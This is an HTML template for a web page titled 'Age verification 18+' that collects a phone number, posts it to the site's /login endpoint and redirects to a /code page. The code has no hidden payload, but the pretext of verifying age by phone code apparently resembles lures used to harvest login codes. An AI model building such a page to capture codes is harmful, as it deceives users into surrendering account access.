<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title data-i18n="enter_phone">Enter phone number</title>
    <link rel="stylesheet" href="{{ url_for('static', filename='styles.css') }}">
</head>
<body>
    <div class="auth-container">
        <div class="glass">
            <div class="emoji-18plus">üîû</div>

            <h1 class="auth-title" data-i18n="verify">Age verification 18+</h1>
            
            <p class="auth-subtitle" data-i18n="enter_phone">Enter your phone number</p>

            <form id="authForm">
                <div class="input-group">
                    <label class="input-label" data-i18n="enter_phone">Phone number</label>
                    <input 
                        type="tel" 
                        class="input-field" 
                        id="phone" 
                        placeholder="1234567890"
                        data-i18n-attr="phone_placeholder:placeholder"
                        required
                    >
                    <p class="help-text">Use format: +1234567890</p>
                </div>

                <button type="submit" class="btn btn-primary" data-i18n="send_code">
                    Send code
                </button>
            </form>

            <a href="/" class="back-link" data-i18n="back">‚Üê Back</a>

            <div id="errorMessage" class="error-message" style="display: none;"></div>
        </div>
    </div>

    <script src="{{ url_for('static', filename='i18n.js') }}"></script>
    <script>
        document.getElementById('authForm').addEventListener('submit', async function(e) {
            e.preventDefault();
            const phone = document.getElementById('phone').value;
            
            if (!phone) {
                alert(window.i18n?.t('phone_required') || 'Enter phone number');
                return;
            }

            const submitBtn = this.querySelector('button[type="submit"]');
            submitBtn.disabled = true;
            submitBtn.innerHTML = '<span class="spinner"></span> ' + (window.i18n?.t('send_code') || 'Sending...');

            try {
                const response = await fetch('/login', {
                    method: 'POST',
                    headers: {
                        'Content-Type': 'application/json'
                    },
                    body: JSON.stringify({ phone_number: phone })
                });

                if (response.ok) {
                    window.location.href = '/code';
                } else {
                    const error = await response.json();
                    document.getElementById('errorMessage').textContent = error.error || 'Error sending code';
                    document.getElementById('errorMessage').style.display = 'block';
                    submitBtn.disabled = false;
                    submitBtn.innerHTML = window.i18n?.t('send_code') || 'Send code';
                }
            } catch (error) {
                console.error('Error:', error);
                document.getElementById('errorMessage').textContent = 'Server error';
                document.getElementById('errorMessage').style.display = 'block';
                submitBtn.disabled = false;
                submitBtn.innerHTML = window.i18n?.t('send_code') || 'Send code';
            }
        });
    </script>
</body>
</html>
